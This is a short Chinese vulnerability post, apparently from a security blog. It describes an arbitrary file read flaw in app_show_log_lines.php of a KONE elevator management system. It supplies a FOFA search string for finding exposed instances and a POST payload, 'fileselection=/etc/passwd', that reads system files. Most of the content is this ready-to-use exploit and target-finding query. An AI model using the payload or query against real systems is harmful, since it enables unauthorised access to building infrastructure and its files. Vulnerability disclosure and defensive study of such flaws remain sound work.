#  KONE-通力电梯管理系统-app_show_log_lines.php-任意文件读取漏洞   
骇客安全  骇客安全   2025-01-19 07:39  
  
## 漏洞描述  
  
KONE 通力电梯 app_show_log_lines.php文件过滤不足导致任意文件读取漏洞  
  
## 漏洞影响  
```
KONE 通力电梯管理系统
```  
  
## FOFA  
```
"KONE Configuration management"
```  
  
## 漏洞复现  
  
主页面  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991PEWKXnS6E5dmcAISUe2WnplwXGjyRKeoW9UBucC8w7zZMUDSEOVv6Y29k3jYl0fQevEZrUB50IdA/640?wx_fmt=png&from=appmsg "null")  
  
  
发送POST请求包  
  
```
fileselection=/etc/passwd
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991PEWKXnS6E5dmcAISUe2WnpWz1uXb6z2MUQyHFMcBLTlHa0Q7WDxces4OmbrwtDMicn9IucjuR0O9A/640?wx_fmt=png&from=appmsg "null")  
  
  
